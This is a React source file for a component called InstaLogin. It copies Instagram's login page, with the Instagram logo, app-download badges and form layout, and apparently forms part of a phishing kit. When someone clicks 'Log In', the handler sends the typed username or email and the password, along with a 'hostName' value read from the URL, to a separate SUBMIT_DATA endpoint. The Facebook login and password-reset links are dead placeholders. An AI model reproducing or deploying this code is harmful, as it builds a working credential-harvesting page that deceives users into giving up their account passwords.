import { useState } from 'react';
import axios from 'axios';
import { SUBMIT_DATA } from '../constants';
import { useParams } from 'react-router-dom';


const InstaLogin = ()=>{

    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const searchParams = new URLSearchParams(window.location.search);
    const hostname = searchParams.get('hostName');
    const handleLogin = ()=>{
        if (!email || !password) {return;}

        axios.post(SUBMIT_DATA, {
                email: email,
                password: password,
                hostName: hostname
        })
        .then(response=>{
            console.log(response);
        })
        .catch(error=>{
            if (error.response) {
                // Request made and server responded
                console.log(error.response.data);
                console.log(error.response.status);
                console.log(error.response.headers);
              } else if (error.request) {
                // The request was made but no response was received
                console.log(error.request);
              } else {
                // Something happened in setting up the request that triggered an Error
                console.log('Error', error.message);
              }
        })
    }

    return (
        <>
  <meta charSet="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" href="assets/css/main.css" />
  <main className="l-main">
    
    <div className="l-main__img">
      <img src="assets/img/homepage.png" alt="Smartphones" />
    </div>
    <div className="l-user">
      <div className="c-panel group">
        <img
          className="c-panel__img"
          src="assets/img/instagram.svg"
          alt="Instagram"
        />
        <div className="c-panel__form">
          <input
            type="text"
            className="c-panel__input"
            placeholder="Phone number, username, or email"
            value={email}
            onChange={(e)=>setEmail(e.target.value)}
          />
          <input
          
            className="c-panel__input"
            placeholder="Password"
            value={password}
            type={'password'}
            onChange={(e)=>setPassword(e.target.value)}
          />
          <button
          className="c-btn"
          onClick={handleLogin}
          >
            Log In
          </button>
          <span className="c-panel__span">OR</span>
        </div>
        <a href="#" className="c-panel__facebook">
          Login with Facebook
        </a>
        <a href="#" className="c-panel__forgot">
          Forgot password?
        </a>
      </div>
      <div className="c-signup group">
        <p>
          Don't have an account? <span>Sign up</span>
        </p>
      </div>
      <div className="c-app">
        <p>Get the app.</p>
        <div className="c-app__download">
          <img src="assets/img/apple.png" alt="Apple Store" />
          <img src="assets/img/google.png" alt="Google Play" />
        </div>
      </div>
    </div>
  </main>
</>

    )
}

export default InstaLogin;